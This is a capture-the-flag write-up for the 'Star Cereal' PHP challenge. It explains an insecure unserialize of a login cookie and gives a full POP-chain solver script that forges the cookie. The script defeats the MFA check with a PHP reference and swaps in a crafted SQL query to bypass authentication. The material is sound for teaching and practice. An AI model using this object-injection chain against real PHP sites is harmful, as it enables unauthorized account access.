# Star Cereal

## Description

Have you heard of Star Cereal? It's a new brand of cereal that's been rapidly gaining popularity amongst astronauts - so much so that their devs had to scramble to piece together a website for their business! The stress must have really gotten to them though, because a junior dev accidentally leaked part of the source code...

`http://20.198.209.142:55043`

_The flag is in the flag format: STC{...}_

## Solution

The goal of this challenge is to perform an authentication bypass through a PHP object injection vulnerability. There are three classes involved, and each one of them needs to be examined to construct a "POP chain" for successful exploitation.

We are given the following page:

Going over to the login page, we see the following 3 fields.

### Source Code Inspection

At the bottom of the provided source code, we see the logic behind the application's authentication.

```php
// Verify login
if(isset($_COOKIE["login"])){
    try
    {
        $login = unserialize(base64_decode(urldecode($_COOKIE["login"])));
        if ($login->verifyLogin())
        {
            $_SESSION['admin'] = true;
        }
        else
        {
            $_SESSION['admin'] = false;
        }
    }
    catch (Error $e)
    {
        $_SESSION['admin'] = false;
    }
}


// Handle form submission
if (isset($_POST['email']) && isset($_POST['pass']) && isset($_POST['token']))
{
    $login = new Login(new User($_POST['email'], $_POST['pass']), $_POST['token']);
    setcookie("login", urlencode(base64_encode(serialize($login))), time() + (86400 * 30), "/");
    header("Refresh:0");
    die();
}
```

The `login` cookie is deserialized into a `Login` object. This should already sound some alarm bells!

The `Login` object consists of a `User` object and an MFA token. The `$mfa_token` is checked against an integer `$_correctValue` randomly generated at runtime. If the check passes, the user credentials are then checked.

```php
class Login
{
    public $user;
    public $mfa_token;

    protected $_correctValue;

    function __construct($user, $mfa_token)
    {
        $this->user = $user;
        $this->mfa_token = $mfa_token;
    }

    function verifyLogin()
    {
        $this->_correctValue = random_int(1e10, 1e11 - 1);
        if ($this->mfa_token === $this->_correctValue)
        {
            return $this->user->is_admin();
        }
    }
}
```

Interestingly, the `User` class instantiates a `SQL` object, and uses it to execute SQL queries to authenticate the user. If results are returned and consist of the `email` and `password` columns, then the authentication is successful.

```php
class User
{
    public $email;
    public $password;

    protected $sql;

    function __construct($email, $password)
    {
        $this->email = $email;
        $this->password = $password;
        $this->sql = new SQL();
    }

    function __toString() 
    {
        return $this->email . ':' . $this->password;
    }

    function is_admin()
    {
        $result = $this->sql->exec_query($this->email, $this->password);

        if ($result && $row = $result->fetch_assoc()) {
            if ($row['email'] && $row['password'])
            {
                return true;
            }
        }
        return false;
    }
}
```

The `SQL` class contains a `$query` attribute that is used to generate a prepared statement. Note that if the `bind_param()` call returns `false`, the authentication fails. This can happen if, for example, the number of parameters in the prepared statement and the number of variables to bind do not match.

```php
class SQL
{
    protected $query;

    function __construct()
    {
        $this->query = "SELECT email, password FROM admins WHERE email=? AND password=?";
    }

    function exec_query($email, $pass)
    {
        $conn = new mysqli("db", getenv("MYSQL_USER"), getenv("MYSQL_PASS"));

        // Check connection
        if ($conn->connect_error) {
            die("Connection failed. Please inform CTF creators.");
        }

        $stmt = $conn->prepare($this->query);

        // Sanity check
        if (! $stmt->bind_param("ss", $email, $pass))
        {
            return NULL;
        }

        $stmt->execute();
        $result = $stmt->get_result();

        return $result;
    }

}
```

### Object Injection

When user data is deserialized into objects, we can inject custom objects to e.g. modify protected attributes, bypass authentication, etc. We can bypass the above checks by using a "POP chain" of custom objects.

#### MFA Token

The MFA token check can be bypassed if we set `$mfa_token` as a reference to the `$_correctValue` attribute using the ampersand (&). Note that in PHP, a reference is simply another variable that points to the same data (unlike pointers in C).

Thus, this will ensure that the two values are always **equal**.

The custom object can be generated as follows:

```php
class Login
{
    public $user;
    public $mfa_token;
    protected $_correctValue;

    function __construct()
    {
        $this->user = new User();
        $this->mfa_token = &$this->_correctValue;
    }
}

$login = new Login();
```

#### SQL

Note that the `SQL` class has a `$query` attribute that is used in the prepared statement. By simply modifying the `$query`, we can perform an SQL injection.

To bypass the authentication we simply need a valid result set with `email` and `password` columns.

We can use something like

```sql
SELECT 'dead@beef' AS email, 'l33t' AS password
```

which will return one row with `email` and `password` columns.

Remember the `bind_param()` check? We still need to make sure that there are two parameters in the prepared statement, so we will do something like this:

```sql
SELECT ? AS email, ? AS password
```

any other valid query that makes use of two parameters would work too.

### Exploit

Using the previously discussed knowledge, it is now trivial to create a solver script that gives us the required base-64 encoded serialized data.

```php
class SQL
{
    protected $query="SELECT ? AS email, ? AS password";
}

class User
{
    public $email = 'dead@beef';
    public $password = 'l33t';
    protected $sql;

    function __construct()
    {
        $this->sql = new SQL();
    }
}

class Login
{
    public $user;
    public $mfa_token;
    protected $_correctValue;

    function __construct()
    {
        $this->user = new User();
        $this->mfa_token = &$this->_correctValue;
    }
}

$login = new Login();
var_dump($login);
echo urlencode(base64_encode(serialize($login)));
```

Running the above script gives us the required cookie value.

Plugging this into the `login` cookie on our browser, we can login and get the flag.
